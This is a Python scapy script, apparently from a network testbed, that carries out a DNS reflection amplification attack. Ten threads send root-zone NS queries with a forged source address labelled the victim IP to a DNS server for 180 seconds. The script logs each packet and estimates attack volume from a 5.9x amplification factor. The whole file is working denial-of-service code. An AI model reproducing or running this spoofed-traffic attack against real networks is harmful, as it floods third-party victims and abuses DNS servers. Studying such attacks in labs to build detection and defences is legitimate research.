# Query packet size: 45bytes
# Response packet size: 267bytes
# Reflection factor: 5.9

from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.volatile import RandShort
from scapy.sendrecv import send
import threading
import time
import queue
import os
import sys



# Number of threads to use
NUM_THREADS = 10
# Number of DNS queries to send per thread
# NUM_QUERIES = 400
# the time duration to send the queries
DURATION = 180 # seconds
# The source IP address to use
SRC_IP = "40.40.10.10"
# The DNS server to send the queries to
DNS_SERVER = "30.30.10.10"
# The domain to query
QUERY_DOMAIN = "."
# The DNS query type
QUERY_TYPE = "NS"
# Attack threads finished flag
ATTACK_THREADS_FINISHED = False

class ByteCounter:
    """
        A threadsafe counter to count the number of bytes sent.
    """
    def __init__(self):
        self.count = 0
        self.lock = threading.Lock()

    def add(self, bytes):
        with self.lock:
            self.count += bytes

    def get(self):
        with self.lock:
            return self.count

# threadsafe counter to count the number of bytes sent
BYTE_COUNTER = ByteCounter()
# threadsafe queue to store the DNS queries
QUEUE = queue.Queue()

def send_custom_dns_query(src_ip, dns_server, domain):
    """
    Sends a custom DNS query to a DNS server.

    Args:
        src_ip (str): The source IP address.
        dns_server (str): The DNS server IP address.
        domain (str): The domain to query.

    Returns:
        None
    """
    dns_query = DNS(rd=1, qd=DNSQR(qname=domain, qtype=QUERY_TYPE))
    
    udp = UDP(sport=RandShort(), dport=53)
    
    ip = IP(src=src_ip, dst=dns_server)

    dns_request = ip/udp/dns_query

    start_time = time.time()
    while time.time() - start_time < DURATION:
        # Send query to attack
        send(dns_request, verbose=0)
        BYTE_COUNTER.add(len(dns_request))
        QUEUE.put({'time': time.time(), 'packet_size': len(dns_request), 'victim_ip': src_ip, 'dns_server': dns_server, 'query_domain': domain, 'query_type': QUERY_TYPE})
        time.sleep(0.2)


# thread to write the DNS queries to a file
def write_dns_queries(run_at_host):
    DNS_QUERIES_FILE = f"audit/dns_queries_{run_at_host}.csv"
    if not os.path.exists(os.path.dirname(DNS_QUERIES_FILE)):
        os.makedirs(os.path.dirname(DNS_QUERIES_FILE))

    with open(DNS_QUERIES_FILE, "a") as f:
        # write the header if the file is empty
        if os.stat(DNS_QUERIES_FILE).st_size == 0:
            f.write("time,packet_size,victim_ip,dns_server,query_domain,query_type\n")
        while not QUEUE.empty() or not ATTACK_THREADS_FINISHED:
            try:
                query = QUEUE.get(block=False)
                f.write(f"{query['time']},{query['packet_size']},{query['victim_ip']},{query['dns_server']},{query['query_domain']},{query['query_type']}\n")
            except queue.Empty:
                time.sleep(0.5)
        print(f"DNS queries log saved to {DNS_QUERIES_FILE}")

    
# Send NUM_THREADS x NUM_QUERIES DNS queries
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python dns_query_attack.py <host_name>")
        sys.exit(1)

    # get host name
    host_name = sys.argv[1]

    attack_threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=send_custom_dns_query, args=(SRC_IP, DNS_SERVER, QUERY_DOMAIN))
        attack_threads.append(t)
        t.start()

    # start the thread to write the DNS queries to a file
    write_thread = threading.Thread(target=write_dns_queries, args=(host_name,))
    write_thread.start()
    # wait for the attack threads to finish
    for t in attack_threads:
        t.join()
    
    print("All threads have finished.")
    print(f"Total bytes sent: {BYTE_COUNTER.get()}")
    approximate_amplification_factor = 5.9
    print(f"Approximate amplification factor: {approximate_amplification_factor}")
    print(f"Approximate reflection amplification attack volume: {BYTE_COUNTER.get() * approximate_amplification_factor}bytes")
    
    # set the attack threads finished flag to True
    ATTACK_THREADS_FINISHED = True
    # wait for the write thread to finish
    write_thread.join()
    